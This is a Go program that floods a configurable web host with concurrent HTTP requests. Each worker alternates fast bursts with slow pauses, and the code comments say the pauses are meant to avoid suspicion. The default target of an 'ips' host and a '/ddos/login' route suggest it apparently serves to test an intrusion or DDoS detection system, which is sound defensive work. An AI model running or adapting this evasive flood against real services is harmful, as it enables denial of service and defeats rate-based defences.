package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"os" // Still imported but less used as routes are hardcoded
	"sync"
	"time"
)

// payload struct remains the same
type payload struct {
	Name        string `json:"Name"`
	Description string `json:"Description"`
	Password    string `json:"password"`
	Email       string `json:"Email"`
	Phone       string `json:"Phone"`
	Address     string `json:"Address"`
	City        string `json:"City"`
	State       string `json:"State"`
	Zip         string `json:"Zip"`
}

// getEnv function remains the same
func getEnv(key, defaultVal string) string {
	val := os.Getenv(key)
	if val == "" {
		return defaultVal
	}
	return val
}

// AttackerRequest defines a single request in the sequence
type AttackerRequest struct {
	Method      string
	Path        string
	PayloadName string // Specific for /ddos/login
	PayloadPass string // Specific for /ddos/login
	IsLoop      bool   // Indicates if this request is part of the infinite loop
}

// sendRequest is a helper function to encapsulate the HTTP request logic
func sendRequest(client *http.Client, method string, url string, p payload, id int, modeStatus string, sleepDuration time.Duration) error {
	bodyBytes, err := json.Marshal(p)
	if err != nil {
		fmt.Printf("[worker %d] json marshal error: %v\n", id, err)
		time.Sleep(1 * time.Second) // Small delay on error
		return nil
	}

	req, err := http.NewRequest(method, url, bytes.NewReader(bodyBytes))
	if err != nil {
		fmt.Printf("[worker %d] request error: %v\n", id, err)
		time.Sleep(1 * time.Second) // Small delay on error
		return nil
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Content-Length", fmt.Sprintf("%d", len(bodyBytes)))
	req.Header.Set("User-Agent", "SlowerFasterBot/1.0") // Custom User-Agent

	resp, err := client.Do(req)
	if err != nil {
		fmt.Printf("[worker %d] error: %v\n", id, err)
		time.Sleep(1 * time.Second) // Small delay on error
		return nil
	}
	// if resp.StatusCode == 403 {
	// 	fmt.Printf("[worker %d] was banned 403 Forbidden, stopping\n", id)
	// 	return fmt.Errorf("403 Forbidden")
	// }
	fmt.Printf("[worker %d] (Mode: %s, Sleep: %v) fired %s request to %s status code: %d\n", id, modeStatus, sleepDuration, method, url, resp.StatusCode)
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	return nil
}

// worker for Slower/Faster Attacker
// This worker now alternates between "fast" and "slow" request modes and follows a specific route sequence.
func worker(wg *sync.WaitGroup, client *http.Client, baseURL string, id int) {
	defer wg.Done()

	// Define the specific sequence of requests
	sequence := []AttackerRequest{
		{Method: "POST", Path: "/ddos/login", PayloadName: "decoy1", PayloadPass: "text"},
		{Method: "GET", Path: "/"},
		{Method: "GET", Path: "/profile"},
		{Method: "GET", Path: "/search?q=a", IsLoop: true}, // Start of the infinite loop
		{Method: "GET", Path: "/api/data/1", IsLoop: true},
	}

	// Define sleep ranges for fast and slow modes (more extreme as requested)
	minFastSleepMs := 0   // Really really fast (0ms minimum)
	maxFastSleepMs := 10  // Really really fast (up to 10ms)
	minSlowSleepSec := 10 // Slow to avoid suspicion (10 seconds minimum)
	maxSlowSleepSec := 30 // Slow to avoid suspicion (up to 30 seconds)

	// Define how long each mode lasts (in number of requests)
	minFastModeRequests := 30 // Longer bursts of fast requests
	maxFastModeRequests := 80
	minSlowModeRequests := 3 // Shorter periods of slow requests
	maxSlowModeRequests := 10

	isFastMode := true // Start in fast mode
	requestsInCurrentMode := 0
	// Initialize targetRequestsForMode for the very first mode
	targetRequestsForMode := rand.Intn(maxFastModeRequests-minFastModeRequests+1) + minFastModeRequests

	// Execute the initial sequence of requests
	for i, reqDef := range sequence {
		if !reqDef.IsLoop { // Process requests that are not part of the infinite loop
			p := payload{
				Name:        reqDef.PayloadName,
				Description: "string",
				Password:    reqDef.PayloadPass,
				Email:       "string",
				Phone:       "string",
				Address:     "string",
				City:        "string",
				State:       "string",
				Zip:         "string",
			}
			err := sendRequest(client, reqDef.Method, baseURL+reqDef.Path, p, id, "INITIAL", 0) // No specific sleep/mode for initial
			if err != nil {
				return
			}
			time.Sleep(time.Duration(rand.Intn(500)+100) * time.Millisecond) // Small delay between initial sequence steps
		} else {
			// Once we hit the first loop request, enter the infinite loop for the remaining requests
			loopStartIndex := i          // This is the index where the infinite loop starts in the sequence
			currentLoopRequestIndex := 0 // Index within the loop segment (0 for /search?q=a, 1 for /api/data/1)

			for { // Infinite loop for the "stay on these routes" phase
				// Determine sleep duration based on current mode
				var sleepDuration time.Duration
				if isFastMode {
					sleepDuration = time.Duration(rand.Intn(maxFastSleepMs-minFastSleepMs+1)+minFastSleepMs) * time.Millisecond
				} else {
					sleepDuration = time.Duration(rand.Intn(maxSlowSleepSec-minSlowSleepSec+1)+minSlowSleepSec) * time.Second
				}

				// Get the current request definition from the loop segment of the sequence
				// Cycle between /search?q=a and /api/data/1
				reqToExecute := sequence[loopStartIndex+(currentLoopRequestIndex%(len(sequence)-loopStartIndex))]

				// Prepare payload (generic for loop requests, specific for ddos/login is already handled)
				p := payload{
					Name:        "SlowerFasterAttacker",
					Description: fmt.Sprintf("Loop request from worker %d", id),
					Password:    "password123",
					Email:       "slowerfaster@example.com",
					Phone:       "987-654-3210",
					Address:     "456 Stealth Ave",
					City:        "Covertville",
					State:       "TX",
					Zip:         "75001",
				}

				err := sendRequest(client, reqToExecute.Method, baseURL+reqToExecute.Path, p, id, func() string {
					if isFastMode {
						return "FAST"
					} else {
						return "SLOW"
					}
				}(), sleepDuration)
				if err != nil {
					return
				}
				time.Sleep(sleepDuration) // Apply the calculated sleep duration

				requestsInCurrentMode++
				currentLoopRequestIndex++ // Move to the next request in the loop segment

				// Check if it's time to switch modes
				if requestsInCurrentMode >= targetRequestsForMode {
					isFastMode = !isFastMode  // Toggle mode
					requestsInCurrentMode = 0 // Reset counter
					// Set new target for the next mode
					if isFastMode {
						targetRequestsForMode = rand.Intn(maxFastModeRequests-minFastModeRequests+1) + minFastModeRequests
					} else {
						targetRequestsForMode = rand.Intn(maxSlowModeRequests-minSlowModeRequests+1) + minSlowModeRequests
					}
					fmt.Printf("[worker %d] Switching to %s mode. Next %d requests.\n", id, func() string {
						if isFastMode {
							return "FAST"
						} else {
							return "SLOW"
						}
					}(), targetRequestsForMode)
				}
			}
		}
	}
}

func main() {
	baseURL := getEnv("target_host", "http://ips:8080")
	concurrency := getEnv("concurrency", "10") // Can use higher concurrency, but each worker will vary its rate

	numWorkers := 10 // Default concurrency
	fmt.Sscanf(concurrency, "%d", &numWorkers)

	rand.Seed(time.Now().UnixNano()) // Seed the random number generator

	client := &http.Client{
		Timeout: 5 * time.Second,
	}

	var wg sync.WaitGroup
	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		// Workers manage their own sequence and methods
		go worker(&wg, client, baseURL, i)
	}

	wg.Wait()
}
